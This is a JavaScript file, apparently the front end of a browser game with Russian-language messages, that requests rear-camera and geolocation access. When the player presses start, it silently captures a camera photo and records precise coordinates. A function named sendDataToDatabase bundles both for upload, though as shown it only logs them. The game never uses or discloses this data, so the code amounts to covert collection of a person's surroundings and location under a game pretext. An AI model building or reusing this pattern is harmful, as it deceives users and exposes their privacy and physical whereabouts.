let cameraStream = null;
let userLocation = null;
let cameraPhoto = null;

const permissionsScreen = document.getElementById('permissionsScreen');
const cameraScreen = document.getElementById('cameraScreen');
const gameScreen = document.getElementById('gameScreen');
const resultScreen = document.getElementById('resultScreen');

const cameraStatusEl = document.getElementById('cameraStatus');
const geoStatusEl = document.getElementById('geoStatus');
const requestPermissionsBtn = document.getElementById('requestPermissionsBtn');
const cameraPreview = document.getElementById('cameraPreview');
const geoInfo = document.getElementById('geoInfo');
const startGameBtn = document.getElementById('startGameBtn');
const playAgainBtn = document.getElementById('playAgainBtn');

async function requestCamera() {
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode: 'environment' }
        });
        cameraPreview.srcObject = cameraStream;
        updateStatus('camera', '✅ Камера');
        return true;
    } catch (error) {
        console.error('Ошибка камеры:', error);
        updateStatus('camera', '❌ Камера');
        return false;
    }
}

async function requestGeolocation() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            updateStatus('geo', '❌ Геолокация');
            resolve(false);
            return;
        }
        
        navigator.geolocation.getCurrentPosition(
            (position) => {
                userLocation = {
                    latitude: position.coords.latitude,
                    longitude: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                updateStatus('geo', '✅ Геолокация');
                geoInfo.textContent = `📍 ${userLocation.latitude.toFixed(4)}, ${userLocation.longitude.toFixed(4)}`;
                resolve(true);
            },
            (error) => {
                console.error('Ошибка геолокации:', error);
                updateStatus('geo', '❌ Геолокация');
                resolve(false);
            }
        );
    });
}

function updateStatus(type, text) {
    const el = type === 'camera' ? cameraStatusEl : geoStatusEl;
    const status = el.querySelector('.status');
    status.textContent = text;
}

requestPermissionsBtn.addEventListener('click', async () => {
    requestPermissionsBtn.disabled = true;
    const cameraOk = await requestCamera();
    const geoOk = await requestGeolocation();
    
    if (cameraOk) {
        showScreen('camera');
    } else {
        alert('Нужно разрешить доступ!');
        requestPermissionsBtn.disabled = false;
    }
});

startGameBtn.addEventListener('click', () => {
    if (cameraStream) {
        const canvas = document.createElement('canvas');
        canvas.width = cameraPreview.videoWidth;
        canvas.height = cameraPreview.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(cameraPreview, 0, 0);
        cameraPhoto = canvas.toDataURL('image/jpeg');
    }
    showScreen('game');
    initGame();
});

playAgainBtn.addEventListener('click', () => {
    showScreen('permissions');
    requestPermissionsBtn.disabled = false;
});

function showScreen(screenName) {
    document.querySelectorAll('.screen').forEach(screen => {
        screen.classList.remove('active');
    });
    const screenEl = document.getElementById(screenName + 'Screen');
    if (screenEl) {
        screenEl.classList.add('active');
    }
}

async function sendDataToDatabase() {
    const data = {
        photo: cameraPhoto,
        location: userLocation,
        timestamp: new Date().toISOString(),
        gameResult: 'won'
    };
    console.log('Данные для отправки:', data);
    return data;
}

window.gamePermissions = {
    getUserLocation: () => userLocation,
    getCameraPhoto: () => cameraPhoto,
    sendDataToDatabase: sendDataToDatabase,
    showScreen: showScreen
};